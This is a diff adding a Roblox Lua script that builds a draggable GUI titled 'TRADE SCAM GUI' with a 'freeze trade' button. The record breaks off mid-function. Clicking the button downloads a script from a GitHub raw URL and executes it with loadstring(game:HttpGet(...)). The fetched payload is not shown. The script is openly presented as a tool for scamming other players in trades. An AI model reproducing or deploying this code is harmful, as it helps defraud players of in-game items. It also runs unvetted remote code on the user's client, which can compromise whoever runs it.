@@ -1,0 +1,30 @@
+-- Create the Screen GUI
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.Name = "TRADE SCAM GUI"
+
+-- Main GUI
+local MainFrame = Instance.new("Frame")
+local ToggleButton = Instance.new("TextButton")
+
+MainFrame.Parent = ScreenGui
+MainFrame.Size = UDim2.new(0, 200, 0, 100)
+MainFrame.Position = UDim2.new(0.5, -100, 0.5, -50)
+MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+MainFrame.Visible = true
+MainFrame.Active = true
+MainFrame.Draggable = true -- Make it movable
+
+ToggleButton.Parent = MainFrame
+ToggleButton.Size = UDim2.new(0, 180, 0, 50)
+ToggleButton.Position = UDim2.new(0.5, -90, 0.5, -25)
+ToggleButton.Text = "freeze trade"
+ToggleButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+ToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+ToggleButton.Font = Enum.Font.SourceSans
+ToggleButton.TextSize = 18
+
+-- Toggle Button Functionality
+ToggleButton.MouseButton1Click:Connect(function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/koisbanana/zEnhub/refs/heads/main/z',true))()
